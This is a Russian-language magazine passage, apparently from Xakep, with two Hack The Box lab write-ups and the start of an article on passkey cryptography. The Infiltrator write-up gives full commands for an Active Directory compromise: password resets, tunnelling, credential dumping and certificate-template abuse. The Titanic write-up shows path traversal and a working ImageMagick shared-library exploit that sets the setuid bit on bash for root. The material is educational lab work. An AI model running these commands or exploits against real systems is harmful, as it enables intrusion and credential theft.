nxc smb DC01.infiltrator.htb -u users.txt -p passwords.txt -k
--continue-on-success





                       Результат перебора

Ошиб ка сменилась на KRB_AP_ERR_SKEW, а зна чит, нам нужно синхро низи -
ровать время на локальной машине с сервером.


sudo timedatectl set-ntp false
sudo ntpdate -s 10.10.11.31


ÒÎ×ÊÀ ÎÏÎÐÛ

У  нас  есть  несколь ко  учеток,  пришло  вре мя  соб рать  базу  дан ных
BloodHound . Для сбора данных с исполь зованием инструментария под Linux
нам нужен рабочий DNS-сер вер, одна ко иногда до него мож но не достучать -
ся. Поэтому мы развернем свой при помощи скрипта DNSChef .




Ути лита BloodHound исполь зует теорию графов для выявления скрытых
и зачас тую непреднамеренных вза имосвязей в среде Active Directory. Ее мож -
но исполь зовать, чтобы легко иден тифицировать очень слож ные пути атаки.


Первым делом нам нужно создать конфиг infiltrator.txt, в котором дол -
жны быть стан дартные для любого домена записи DNS.


[A]
*.infiltrator.htb=10.10.11.31
[SRV]
_ldap._tcp.pdc._msdcs.infiltrator.htb=0 5 389 infiltrator.htb
_ldap._tcp.gc._msdcs.infiltrator.htb=0 5 389 infiltrator.htb
_kerberos._tcp.dc._msdcs.infiltrator.htb=0 5 88 infiltrator.htb

Затем отклю чаем системный резолвер и запускаем свой DNS-сервер.


sudo systemctl stop systemd-resolved


python3 dnschef.py --file ./infiltrator.txt





                        Запуск DNSChef

Затем используем скрипт bloodhound-ce для сбора дан ных BloodHound.
После завершения работы скрипта не забыва ем отключить DNSChef и снова
активировать systemd-resolved .


python3 bloodhound.py -d 'infiltrator.htb' -u 'L.Clark' -p
'WAT?watismypass!' -c All -ns 127.0.0.1 -dc DC01.infiltrator.htb
--use-ldap --zip --auth-method ntlm


sudo systemctl start systemd-resolved





                    Сбор данных BloodHound

Строим граф от поль зователя D.ANDERSON .





                       Граф BloodHound

Пользователь  D.ANDERSON  име ет  право  GenericAll  на  под разделение
MARKETING DIGITAL , где состоит поль зователь E.RODRIGUEZ. Это право поз -
воляет нам  назначить любые пра ва  для  всех  членов подразделения.
С помощью скрип та dacledit из пакета Impacket даем пользователю D.
ANDERSON полные пра ва на всех чле нов MARKETING DIGITAL .


dacledit.py -action 'write' -rights 'FullControl' -inheritance
-principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,
DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson:WAT?watismypass!'
-k -dc-ip 10.10.11.31




                 Назначение прав на подразделение

Теперь D.ANDERSON имеет полные права на E.RODRIGUEZ и может сменить
пароль  целевой  учет ной  записи.  Эксплуатировать  разрешения можно
с помощью bloodyAD .


python3 bloodyAD.py --host "dc01.infiltrator.htb" --dc-ip 10.10.11.
31 -d infiltrator.htb -u d.anderson -p 'WAT?watismypass!' -k set
password E.RODRIGUEZ 'RRrr!!11'


            Изменение пароля пользователя E.RODRIGUEZ

Так мы скомпрометировали еще одну учетную запись. Вернемся к нашему
гра фу и обра тим вни мание, что пользователь E.RODRIGUEZ имеет пра во
AddSelf на группу CHIEFS MARKETING. Это пра во позволяет пользователю
добавить себя в целевую группу, что мы также можем сделать с помощью
bloodyAD.


python3 bloodyAD.py --host "dc01.infiltrator.htb" --dc-ip 10.10.11.
31 -d infiltrator.htb -u e.rodriguez -p 'RRrr!!11' -k add
groupMember 'CHIEFS MARKETING' E.RODRIGUEZ


               До бавление пользовате ля в группу

Судя  по  гра фу,  члены  груп пы  CHIEFS   MARKETING  име ют  право
ForceChangePassword на учет ную запись M.HARRIS. Это право позволяет
изменить пароль целевой учетной записи.


python3 bloodyAD.py --host "dc01.infiltrator.htb" --dc-ip 10.10.11.
31 -d infiltrator.htb -u e.rodriguez -p 'RRrr!!11' -k set password M.
HARRIS 'RRrr!!11'


             Изменение пароля пользователя M.HARRIS

Пользователь M.HARRIS сос тоит в груп пах DEVELOPERS , REMOTE MANAGEMENT
USERS (можем авторизо вать ся по WinRM) и PROTECTED USERS . Из-за пос -
ледней груп пы мы не можем зай ти по WinRM с использованием аутен тифика -
ции NTLM, поэтому будем использовать Kerberos. Сначала зап росим TGT-
билет поль зовате ля.


getTGT.py 'infiltrator.htb/m.harris:RRrr!!11' -dc-ip 10.10.11.31




                    Получение TGT-билета

А теперь внесем запись о домене в файл /etc/krb5.conf и получим сес сию
через Evil-WinRM .


[libdefaults]
        default_realm = INFILTRATOR.HTB
[realms]
        INFILTRATOR.HTB = {
                kdc = DC01.INFILTRATOR.HTB
        }

Так получа ем первый флаг.


KRB5CCNAME='m.harris.ccache' evil-winrm -i dc01.infiltrator.htb -u
'm.harris' -r INFILTRATOR.HTB




                       Флаг поль зователя


ÏÐÎÄÂÈÆÅÍÈÅ

Для продвижения нам нужно собрать информацию. Я буду использовать
для этого скрип ты PEASS.




Что делать после того, как мы получили доступ в систему от имени поль -
зовате ля? Вариантов дальнейшей экс плуатации и повыше ния привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информа цию и наметить  цели, можно использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис -
тему на автомате и выда ют под робный отчет о потен циаль но инте ресных
фай лах, процес сах и настройках.


Загрузим на удаленный хост исполняемый файл для Windows и запустим ска -
нирование. В выводе будет много всего, наша цель — найти потен циальные
зацепки для продвижения.
  Среди уста новленного ПО находим Output Messenger Server, при этом
сразу узнаем, на каких портах работа ет софт.





                    Спи сок ПО в автозагрузке




                                     Продолжение статьи →
ВЗЛОМ                         НАЧАЛО СТАТЬИ



              РАСКРУЧИВАЕМ ЦЕПОЧКУ
             УЯЗВИМОСТЕЙ ПРИ АТАКЕ
                 НА ACTIVE DIRECTORY





                   Прослушиваемые TCP-порты

Корпоративный мессенджер занима ет много портов, поэтому нам необ -
ходимо  тун нелировать  тра фик. Для  этого будем использовать  Chisel .
На локаль ном хосте запустим сервер, ожи дающий подклю чения (параметр --
reverse ) на порт 8888 (параметр --p).


./chisel.bin server --p 8888 --reverse

Затем на уда ленном хосте запустим кли ентскую часть. Указыва ем адрес сер -
вера и порт для подклю чения, а также нас трой ки для туннеля. Будем прокиды -
вать порты, занимаемые мес сенджером.


.\chisel.exe client 10.10.16.17:8888 R:14121:127.0.0.1:14121 R:14122:
127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14124:127.0.0.1:14124 R:
14125:127.0.0.1:14125 R:14126:127.0.0.1:14126

Когда тун нель готов, скачива ем кли ент Output Messenger и пробуем авто -
ризо вать ся от имени k.turner.





                   Ав торизация Output Messenger





                  Сообще ния в чате Dev_Chat

В чате Dev_Chat говорится про какую-то консоль ную утилиту для подключения
к LDAP, при этом у нее есть опция подклю чения с дефол тными кре дами. Так же
находим инструкцию по под ключению, в которой ука заны учетные данные
пользователя m.harris.





               Инструкция по исполь зованию утилиты

Ав торизуемся в мессенджере от име ни пользователя m.harris и в чате
с адми ном находим исполняемый файл.





                            Чат с админом

Так как в при ложе нии есть дефол тные учетные данные и написано оно на C#,
мы можем его легко декомпилировать и получить еще одну учет ку.


Ïîëüçîâàòåëü winrm_svc
Де компилируем исполняемый файл через dotPeek и сразу находим зашиф -
рованный пароль.





                Результат декомпиляции программы

Немного перепишем декомпилиро ван ный код для расшифровки пароля
и получим пароль в откры том виде.


using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;


namespace ConsoleApp2
{
    public class Decryptor
    {
        public static string DecryptString(string key, string
cipherText)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = new byte[16];
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.
Key, aes.IV);
                using (MemoryStream memoryStream = new MemoryStream(
Convert.FromBase64String(cipherText)))
                {
                    using (CryptoStream cryptoStream = new
CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new
StreamReader((Stream)cryptoStream))
                            return streamReader.ReadToEnd();
                    }
                }
            }
        }
    }


    internal class Program
    {
        static void Main(string[] args)
        {
            string str2 = "winrm_svc";
            string cipherText = "TGlu22oo8GIHRkJBBpZ1nQ/
x6l36MVj3Ukv4Hw86qGE=";
            string b64password = Decryptor.DecryptString(
"b14ca5898a4e4133bbce2ea2315a1916", cipherText);
            b64password = Decryptor.DecryptString(
"b14ca5898a4e4133bbce2ea2315a1916", b64password);
            Console.WriteLine(b64password);
        }
    }
}





                    Па роль в открытом виде

С полученными учет ными данными авторизу емся в кор поративном мессен -
джере, где продол жаем собирать данные из раз ных чатов. В чате упомина -
ется, что каждый день пользователь, как по рас писанию, получает уведом -
ления.  Также  узна ем,  что  пользователь  писал  свой  пароль  в  чате
Chiefs_Marketing_chat .





                         Чат с поль зователем

Также в мес сен дже ре находим ключ API для акка унта lan_managment .





                                API-ключ

С полученным ключом мы можем обращаться к API мессенджера. Получим
чаты по эндпоинту /api/chatrooms/ .


curl -s -k -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H
'Accept: application/json, text/javascript, */*' -H 'Host:
infiltrator.htb:14125' 'http://127.0.0.1:14125/api/chatrooms/' | jq





                            Активные чаты

Для получения содержимого чатов через API нам нужны идентификаторы,
которые мы можем дос тать из базы данных мессендже ра. От имени текущего
пользователя под клю чаемся к службе WinRM.


evil-winrm -i dc01.infiltrator.htb -u winrm_svc -p 'WinRm@$svc^!^P'





                  Сессия поль зователя winrm_svc


Ñåññèÿ o.martinez
Переходим к каталогу при ложе ния Output  Messenger и, помимо логов,
находим там еще один каталог.





             Содер жимое каталога Output Messenger

В каталоге JAAA обна ружи ваем файл базы дан ных OM.db3, который ска чива -
ем на локаль ный хост.





                     Содержимое JAAA

Открываем файл через DB Browser и получа ем идентификатор чата из таб -
лицы om_chatroom .





               Содержимое таблицы om_chatroom

Теперь получим логи чата через API /api/chatrooms/logs .


curl -s -k -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H
'Accept: application/json, text/javascript, */*' -H 'Host:
infiltrator.htb:14125' 'http://127.0.0.1:14125/api/chatrooms/
logs?roomkey=20240220014618@conference.com&fromdate=2024/02/01&
todate=2024/09/01' | jq





                          Логи чата

В логах есть учетные данные, с которы ми авторизуемся в мессенджере.
Вспо мина ем про зап ланированную задачу, о которой говорилось в чате,
и переходим к календарю. Среди спис ка событий мож но выб рать запуск при -
ложе ния.





                  События Output Messenger

Ука зываем для запуска путь к файлу агента Havoc. Этот файл должен быть
расположен по указанному пути и на нашем клиенте Windows, и на сервере.





                      Параметры события

Ровно в ука занное время произой дет запуск агента.




                        Сессии Havoc


Ïîëüçîâàòåëü o.martinez
У нового поль зовате ля сра зу изу чим каталог мессен джера.





               Содержимое каталога мес сенджера

В каталоге FAAA есть ска чанные файлы. В одной из папок — скачанный дамп
трафика.





                  Содержимое каталога FAAA





                        Ска чанные фай лы

Ко мандой download забираем файл PCAPNG на локальный хост для анализа
в Wireshark . В дампе есть пакеты HTTP, а зна чит, есть шанс най ти учетные
данные.





                      Пакеты в Wireshark

Да вай прос мотрим все запросы и отве ты HTTP в удобном виде, для чего
выберем первый пакет HTTP и в контекстном меню нажмем «Отсле живать
HTTP Stream».





                      Отсле живание HTTP

В  потоке  6  видим  ска чива ние  файла  Bitlocker-backup.7z ,  а  в
потоке 11 находим пароль пользователя.





                    HTTP-запрос/ответ — поток 6





                    HTTP-запрос/ответ — поток 11




                                     Продолжение статьи →
ВЗЛОМ                         НАЧАЛО СТАТЬИ



              РАСКРУЧИВАЕМ ЦЕПОЧКУ
             УЯЗВИМОСТЕЙ ПРИ АТАКЕ
                 НА ACTIVE DIRECTORY




Учетные данные поз волят нам под ключиться по RDP, но перед этим сдампим
из тра фика скачан ный архив. Для это го в Wireshark выбира ем в меню «Файл
  Экспортировать объекты   HTTP». В новом окне будет отоб ражен спи сок
со всеми файлами из дампа. Все эти фай лы можно сох ранить локально.





                     Экспорт объектов HTTP





                   Файлы из дампа тра фика

Архив 7-Zip запаролен, поэто му с помощью 7z2john получаем хеш, который
переби раем с помощью John the Ripper .


./7z2john.pl 'BitLocker-backup(1).7z' > 7z_hash.txt
john --wordlist=rockyou.txt 7z_hash.txt



                    Резуль тат подбора пароля

В архи ве есть сохраненная HTML-страница с ключами BitLocker.





                 Содержимое HTML-страницы


Ïîëüçîâàòåëü lan_managment
Заходим по RDP как o.martinez и в проводнике сразу отмечаем зашиф -
рованный диск E .





                      Проводник Windows

Расшифру ем его с помощью ключа восстановления BitLocker с HTML-стра -
нички и уви дим внут ри резер вную копию дис ка C .





                    Содер жимое дис ка E

В каталоге с документами у адми нистра тора есть резервная копия файла
ntds.dit.





                  Документы администратора





                    Содержимое архи ва

Файл ntds.dit содержит информа цию о поль зователях домена, включая хеши
их паролей и ключ Kerberos. Извлечь учетные данные можно с помощью
secretsdump из Impacket.


secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit LOCAL





                  Учетные данные пользовате лей домена

Сохраня ем имена доменных пользователей и их хеши в два файла и валиди -
руем учет ные данные с помощью NetExec.


nxc smb 10.10.11.31 -u ntds_users.txt -p ntds_passwords.txt
--no-bruteforce --continue-on-success





                    Проверка учетных данных

И ни одна не оказалась валидной! Попробуем получить расширенную
информа цию о пользовате лях. Для анализа файла ntds.dit будем исполь -
зовать ути литу ntdsdotsqlite .


ntdsdotsqlite ntds.dit --system SYSTEM -o NTDS.sqlite

В итоге получим базу данных SQLite со всеми данными. В описании поль -
зовате ля lan_managment находим пароль от учетной записи.





                     Данные из фай ла ntds.dit


Ïîëüçîâàòåëü infiltrator_svc$
Граф BloodHound показы вает, что у поль зователя lan_managment есть право
ReadGMSAPassword на объект infiltrator_svc$ .





                       Граф BloodHound




Уп равля емые учет ные записи (MSA) — это специальный тип учетных записей
Active Directory, которые можно использовать для безопасного запуска служб,
приложе ний и заданий планировщика. Основная их идея в том, что паролем
полностью управля ет Active Directory.
  Для  таких уче ток автомати чески генерируется сложный пароль дли -
ной 240 символов, который меняется автомати чески каж дые 30 дней.
Для аутентифика ции используется толь ко Kerberos, так как интерактивный
вход невоз можен. Это связано с тем, что пароль не известен никому и не хра -
нится в локальной сис теме, поэтому его нельзя извлечь из системного про -
цес са LSASS с помощью Mimikatz.



Но и такими учет ными записями нужно как-то управлять, а это значит, что,
если у нас есть к ним доступ, мы можем получить хеш ее пароля. Сделаем
это с помощью NetExec.


nxc ldap 10.10.11.31 -u lan_managment -p 'l@n_M@an!1331' --gmsa




            Получе ние хеша учетной записи inltrator_svc$

У нас есть хеш пароля учетной записи infiltrator_svc$ , а значит, мы ском -
прометировали еще одну учетную запись.


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

ESC4
На сервере развернута служба сер тифика ции Active Directory, а значит, стоит
проверить нас тройки ADCS и активных шаблонов сер тифика тов. Для этого
будем использовать утилиту Certipy .


certipy find -u 'infiltrator_svc$' -hashes
407546ca61cd7d3870e7dc6b0b007ecd -dc-ip 10.10.11.31 -vulnerable
-stdout





            Шаб лон сер тификата Inltrator_Template

Ути лита отме чает, что шаблон сертификата Inltrator_Template мож но исполь -
зовать для эксплуата ции уязвимос ти ESC4.




Уяз вимость ESC4 заключа ется в том, что атакующий может изменять свой -
ства шаб лона сертифика та. Например, мы можем изме нить параметры сер -
тификата так, чтобы он был уязвим к ESC1 — ког да шаблон сертификата раз -
решает проверку под линнос ти кли ента и дает запрашивающему указать про -
изволь ное аль тер натив ное имя субъ екта (SAN). Это приводит к тому, что мы
можем пройти аутентифика цию от име ни при виле гированного пользователя,
вклю чая адми нистратора домена.


Мо дифи циру ем шаб лон сертифика та Infiltrator_Template , а затем зап -
росим сертификат на имя поль зовате ля administrator.


certipy template -u 'infiltrator_svc$' -hashes
407546ca61cd7d3870e7dc6b0b007ecd -dc-ip 10.10.11.31 -template
Infiltrator_Template -save-old


certipy req -u 'infiltrator_svc$' -hashes
407546ca61cd7d3870e7dc6b0b007ecd -dc-ip 10.10.11.31 -ca infiltrator-
DC01-CA -target infiltrator.htb -template Infiltrator_Template -upn
administrator@infiltrator.htb





                       Запрос сер тификата

С помощью тех ники UnPAC the hash по сертифика ту запросим TGT-билет
пользователя и извле чем из него хеш пароля адми нис тратора.


certipy auth -pfx administrator.pfx





                        UnPAC the hash

Осталось авторизовать ся на сервере и заб рать пос ледний флаг.


evil-winrm -i dc01.infiltrator.htb -u administrator -H
1356f502d2764368302ff0369b1121a1





                           Флаг рута

Ма шина захвачена!
ВЗЛОМ





Се годня я покажу, как мож но исполь зовать
уяз вимую версию ImageMagick для выпол -
нения кода в Linux от имени рута. Однако
сначала нам  пот ребуется проэксплуати -
                                                                                         RalfHacker
                                                                                             hackerralf8@gmail.comровать LFI и добыть дан ные из базы Gitea,
чтобы получить оболочку на сервере.


Наша цель — получение прав суперполь зователя на машине Titanic с учебной
площадки Hack The Box . Уровень задания — лег кий.




                     Под ключать ся к машинам с HTB рекомен дуется
                        с применением средств ано ними зации и вир -
                        туализации. Не делай это го с компьютеров, где
                         есть важные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими участниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
До бавляем IP-адрес машины в /etc/hosts :


10.10.11.55    titanic.htb

И запус каем сканирование портов.




Сканирование портов — стандартный первый шаг при любой атаке. Он поз -
воляет ата кующему узнать, какие службы на хос те принимают соединение.
На основе этой информа ции выбира ется следующий шаг к получе нию точки
входа.
  На иболее извес тный инс трумент для сканиро вания — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи сле дующего скрип та:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он дей ству ет в два эта па. На первом произво дится обыч ное быстрое ска -
нирование, на втором — более тщательное ска ниро вание, с использованием
имеющих ся скрип тов (опция -A ).





                    Резуль тат работы скрипта

Сканер нашел два откры тых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб-сервер Apache 2.4.52.

С SSH мы пока что ничего сделать не можем, поэтому начина ем с веб-сер -
вера.





                        Главная страница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ

В меню сай та ничего интерес ного, поэтому воспользуемся единствен ной
дос тупной на дан ный момент функци ей Book Your Trip.





                    Фор ма Book Your Trip

Запол няем форму тес товыми данными и нажима ем кнопку Submit. В этот
момент загружается какой-то JSON-файл.





                           Загрузка файла

Просмотрим, как этот про цесс выглядит в Burp Proxy . Данные из формы
отправляют ся POST-зап росом на стра ницу /book , после чего про исходит
редирект на стра ницу /download . Файл для скачива ния указан в параметре
ticket.





                       Запрос в Burp Proxy

Про верим, нет ли здесь уяз вимос ти LFI — локального вклю чения файлов.
Для этого через Burp Repeater выполним зап рос на стра ницу /download и в
парамет ре ticket ука жем файл /etc/passwd с обходом каталога.





                Содер жимое файла /etc/passwd




                     Под робнее о прин ципах работы LFI читай в статье
                            « File Inclusion и Path  Traversal. Разбираем две
                      базовые веб-уязвимости ».


Уяз вимость при сутс тву ет, а значит, мы можем читать произвольные файлы.
Так как в качес тве веб-сер вера использует ся при ложение на Python, первым
делом где-то рядом с текущим каталогом поищем характерный для таких про -
ектов файл app.py — основной файл приложения.





                  Содержимое фай ла app.py

Если выполнить зап рос на веб-сер вер не по домен ному имени, а по IP, в отве -
те в заголовке Server будет отмечен веб-сервер Apache.





                    Данные запроса и ответа

Так как Apache перенаправляет зап росы, проверим стандар тный для него
конфиг  /etc/apache2/sites-enabled/000-default.conf . Однако  новых
сай тов мы там не обнаружим.





               Содержимое фай ла 000-default.conf

Мы знаем доменное имя, поп робу ем подоб рать поддомены.




Одно из первых действий при тестировании безопасности веб-приложе -
ния — это сканирование методом перебо ра каталогов, чтобы найти скрытую
информа цию и недос тупные обычным посетителям функции. Для этого мож но
исполь зовать прог раммы вроде dirsearch и DIRB .
  Я пред почитаю легкий и очень быстрый ﬀuf . При запуске указываем сле -
дующие параметры:
 • -u — URL;
 • -H — HTTP-заголовок;
 • -w — словарь (я использую словари из набора SecLists );
 • -t — количество потоков.

Место перебора помечается словом FUZZ.



Чтобы в выводе не отоб ражались все варианты из словаря, нужно уста новить
филь тр. В нашем случае фильтровать можем по коду ответа сер вера
(параметр -fс).
  Собираем всё вмес те и запус каем:


ffuf -u http://titanic.htb -H 'Host: FUZZ.titanic.htb' -w subdomains-
top1million-110000.txt -t 128 -fc 301



                Ре зультат ска нирования под доменов


ÒÎ×ÊÀ ÎÏÎÐÛ

Мы нашли новый сайт, для дос тупа к которому обно вим запись в файле /etc/
hosts . При обновлении стра ницы нас встретит сервис Gitea.


10.10.11.55 titanic.htb dev.titanic.htb





                        Главная страница сай та

Посмотрим дос тупные репози тории. Их два: docker-config и flask-app.





                       Репозитории Gitea

В репозитории docker-config находим файл docker-compose.yml. Там есть
учет ные дан ные для под ключения к базе дан ных.





             Содержимое фай ла docker-compose.yml

Пароль никуда не подошел, однако, если прос мотреть историю коммитов,
в одном из них найдем каталог /home/developer/gitea , где развернут Gitea.





             Содержимое фай ла docker-compose.yml

Попробуем добраться до фай ла базы данных Gitea. Тут нам поможет най ден -
ная ранее уязвимость LFI. Получим файл по сле дующе му URL-эндпоинту:


/download?ticket=../../../../../../../home/developer/gitea/data/
gitea/gitea.db

Откроем файл базы данных в DB Browser for SQLite и просмотрим данные
из таб лицы user .





                  Содержимое таблицы user




                                     Продолжение статьи →
ВЗЛОМ                         НАЧАЛО СТАТЬИ



                 ЭКСПЛУАТИРУЕМ RCE
                     В IMAGEMAGICK




Осталось пробрутить хеши и получить пароли пользователей Gitea. В этом
нам поможет пост в бло ге unix-ninja.
  Из базы нам нужно получить зна чения iterations , salt и hash , пред ста -
вить  в формате pbkdf2-sha256:$iterations:$salt:$hash и  передать
в при веденный ниже скрипт для преобра зова ния в фор мат hashcat .


#!/usr/bin/python3
# Converts gitea PBKDF2-HMAC-SHA256 hashes into a format hashcat can
use
# written by unix-ninja


import argparse
import base64
import sys


def convert_hash(hash_string):
    """Converts a SALT+HASH string to a hashcat compatible format,
       ensuring the smaller input is treated as the salt.
       Use : or | as delimeters.
    """
    hash_string = hash_string.replace('|', ':')
    try:
        part1, part2 = hash_string.split(":")
    except ValueError:
        print(f"[-] Invalid input format: {hash_string}")
        return None


    try:
        bytes1 = bytes.fromhex(part1)
        bytes2 = bytes.fromhex(part2)
    except ValueError:
      print(f"[-] Invalid hex input: {hash_string}")
      return None


    # If lengths are equal, we will maintain the original order
    if len(bytes1) > len(bytes2):
        salt_bytes = bytes2
        hash_bytes = bytes1
    else:
        salt_bytes = bytes1
        hash_bytes = bytes2



    salt_b64 = base64.b64encode(salt_bytes).decode('utf-8')
    hash_b64 = base64.b64encode(hash_bytes).decode('utf-8')


    return f"sha256:50000:{salt_b64}:{hash_b64}"



def main():
    parser = argparse.ArgumentParser(description="Convert Gitea
SALT+HASH strings to a hashcat-compatible format.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Example:
    gitea2hashcat.py <salt1>:<hash1> <hash2>|<salt2> ... or pipe
input from stdin.


    You can also dump output straight from sqlite into this script:
        sqlite3 gitea.db 'select salt,passwd from user;' |
gitea2hashcat.py""")
    parser.add_argument('hashes', nargs='*', help='SALT+HASH strings
to convert')
    args = parser.parse_args()


    # ... (rest of the main function remains the same)
    print("[+] Run the output hashes through hashcat mode 10900 (
PBKDF2-HMAC-SHA256)")
    print()


    if args.hashes:
        # Process command-line arguments
        for hash_string in args.hashes:
            converted_hash = convert_hash(hash_string)
            if converted_hash:
                print(converted_hash)


    else:
        # Process input from stdin
        for line in sys.stdin:
            hash_string = line.strip()  # Remove leading/trailing
whitespace
            converted_hash = convert_hash(hash_string)
            if converted_hash:
                print(converted_hash)



if __name__ == "__main__":
    main()



              Преобра зование хеша в формат hashcat

По лученное значение сохраня ем в файл и отда ем хешкету, при этом указыва -
ем режим 10900.


hashcat -m 10900 hash.txt rockyou.txt





                    Резуль тат подбора пароля

С полученными учет ными данными авторизуемся по SSH и забираем первый
флаг.




                       Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Теперь нам необходимо соб рать информа цию о системе. Я буду исполь -
зовать для этого скрип ты PEASS.




Что делать после того, как мы получили доступ в систему от имени поль -
зовате ля? Вариантов дальнейшей экс плуатации и повыше ния привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информа цию и наметить  цели, можно использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис -
тему на автомате и выда ют под робный отчет о потен циаль но инте ресных
фай лах, процес сах и настройках.



Загрузим на уда лен ный хост скрипт для Linux, дадим право на выполнение
и запустим сканирование. В выводе будет мно го информа ции, поэтому ищем
толь ко то, что сможет нам помочь.
   Чле ны группы developer (а мы в нее входим) имеют пра во записи
в каталоги /opt/app/tickets и /opt/app/static/assets/images.





                  Доступные для записи каталоги

Среди добавленных пользователем исполняемых файлов есть скрипт /opt/
scripts/identify_images.sh .





          Исполняемые файлы, добав ленные пользователем

Посмотрим содер жимое най денного скрип та. Из интересного раз ве что
запуск в скрипте утилиты magick, но это можно использовать.




              Содержимое фай ла identify_images.sh

Это ути лита из пакета ImageMagick. Давай проверим его версию.





                      Версия ImageMagick

На сервере установ лена версия 7.1.1-35. Воз можно, для нее есть готовые
пуб личные экс плоиты. Поищем их.





                   Поиск эксплоитов в Google

Первая  ссылка  из  Google  при водит  нас  к  инте ресной информации:
ImageMagick до версии 7.1.1-36 имеет уязвимость CVE-2024-41817.
   ImageMagick может использовать пустой путь при установ ке переменных
среды MAGICK_CONFIGURE_PATH и LD_LIBRARY_PATH, что способно при вести
к выполнению произвольного кода путем загрузки произвольных конфигов
или биб лиотек из рабоче го катало га во время выпол нения ImageMagick.
  Сделаем свою биб лиоте ку libxcb.so.1 в каталоге /opt/app/static/
assets/images/ . В коде будем просто назначать файлу коман дной оболочки
S-бит.


#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init(){
    system("chmod u+s /bin/bash");
    exit(0);
}


gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1
expl.c




                     Эксплуата ция уязвимос ти




Когда у файла установ лен атрибут setuid (S-атрибут), обычный пользователь,
запус кающий этот файл, получа ет повышение прав до пользователя — вла-
дель ца файла в рамках запущенного процесса. Пос ле получения повышен ных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю.


Теперь мы можем выполнить /bin/bash в кон тексте пользователя root.


/bin/bash -p





                           Флаг рута

Ма шина захвачена!
ПРИВАТНОСТЬ





При слове «криптография» все обычно сразу думают о шиф -
ровании, то есть сохранении данных в секрете. Но не менее
важна и подлинность: гарантия того, что информация дей -
ствительно исхо дит от надежного источника. Пароли тра -
диционно служат для аутентификации поль зователей, но они
уяз вимы  для  фишинг-атак  и  уте чек  данных. И  здесь
на помощь приходят passkeys, они же — ключи дос тупа.




                      Это  близкий  к  тек сту  пересказ  пос та  The
                         cryptography behind passkeys из блога The  Trail
                             of Bits . Автор — Йоп ван де Пол. Этот материал
                      доступен без платной под писки.


Не будем здесь долго разглагольствовать о том, что такое passkeys и почему
они кру че паролей, — этой темой уже занялись мно гие ре сурсы весь ма под -
робно .
  Вмес то этого заглянем под капот и разберемся в криптографических
механиз мах, стоящих за passkeys: какие гарантии они дают или не дают и что
инте ресного можно с этим сделать, например как создавать криптографичес -
кие клю чи и хранить сертифика ты.
   Также  поговорим  о  главной  спецификации  passkeys —  WebAuthn
и покажем,  как использовать рас ширения механизмов клю чей доступа
для соз дания более сложных сис тем с разными возможностями.


ÎÑÍÎÂÛ

Passkeys — это, по сути, пара криптографических клю чей: один публичный
(откры тый), дру гой при ватный (сек ретный).
   Ког да ты соз даешь passkey (парольный ключ) на сайте, тот сох раняет
у себя толь ко пуб личный ключ и спе циаль ный идентификатор, связанный
с этим клю чом.
  Потом, когда ты пытаешься вой ти на сайт, он отправляет тебе спе циаль -
ную задачу (вызов), которую нужно подписать при ват ным ключом. Вместе
с ответом ты отправляешь и идентификатор, что бы сайт знал, какой пуб -
личный ключ исполь зовать для проверки. Если под пись правильная — вход
разреша ется.
  С точ ки зре ния криптогра фии тут все прос то. Закрытый ключ подтверждает
твою личность, но на сервер не уходит ничего такого, что мог ло бы при -
годиться взломщику. Если серверная задача сгенерирована правильно, нап -
ример  как случай ная последова тельность из 32  байт, то это защитит
от перебора. Сервер хра нит только открытый ключ, и, поскольку ты ничего
важного туда не отправляешь, в случае взло ма никаких утечек не будет.
  Но одних только цифровых подписей недос таточ но, чтобы решить проб -
лему фишин га. Если остановиться только на криптографии, поль зователи все
равно оста ются под угрозой. Нап ример, без допол нительных мер злоумыш -
ленник может уговорить поль зователя подписать что-то от имени другого
сай та или исполь зовать одну и ту же пару ключей на нескольких сай тах.
   Вот почему passkeys созданы на основе спе цифи кации WebAuthn от W3C ,
которая добавляет к базовой криптографии важные защитные механиз мы.
Давай разберемся, как WebAuthn превращает эти простые криптографичес -
кие фичи в систему аутентификации, стой кую к фишингу.


ÂÅÁ-ÀÓÒÅÍÒÈÔÈÊÀÖÈß (WEBAUTHN)

WebAuthn —  это  основа  технологии  passkeys.  Если  по-простому,  то
это работает так: ты заходишь на сайт (он же — relying party) через браузер (в
роли WebAuthn user agent), исполь зуя любое устрой ство — ноутбук, смартфон
или ПК. Бра узер общается с аутентификатором — желез кой или прог раммой,
которая генерит клю чевую пару для passkeys и создает цифровые подписи
с ее помощью.





       Упрощен ная схема аутентификации с помощью клю ча дос тупа

На схеме выше ты можешь уви деть, как работает аутен тифика ция с исполь -
зовани ем passkeys:
 1. Сайт запрашива ет авториза цию через браузер.
 2. Бра узер связыва ется с аутентифика тором.
